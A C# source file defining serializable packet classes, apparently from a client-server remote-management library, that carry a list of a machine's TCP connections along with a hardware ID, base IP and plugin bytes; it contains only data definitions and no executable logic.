using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class TCPInformation
    {
        public string processName { get; set; }
        public int PID { get; set; }
        public string LocalEndPoint { get; set; }
        public string RemoteEndPoint { get; set; }
        public TCP_CONNECTION_STATE State { get; set; }

        public enum TCP_CONNECTION_STATE
        {
            CLOSED = 1,
            LISTENING,
            SYN_SENT,
            SYN_RCVD,
            ESTABLISHED,
            FIN_WAIT_1,
            FIN_WAIT_2,
            CLOSE_WAIT,
            CLOSING,
            LAST_ACK,
            TIME_WAIT,
            DELETE_TCP
        }
    }

    [Serializable]
    public class NetworkInformationPacket : IPacket
    {
        public NetworkInformationPacket() : base()
        {
            this.PacketType = PacketType.MISC_NETWORK_INFORMATION;
        }

        public NetworkInformationPacket(List<TCPInformation> tcpInformationList, string baseIp, string HWID) : base()
        {
            this.PacketType = PacketType.MISC_NETWORK_INFORMATION;
            this.BaseIp = baseIp;
            this.HWID = HWID;
            this.tcpInformationList = tcpInformationList;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public List<TCPInformation> tcpInformationList{ get; set; }
    }
}
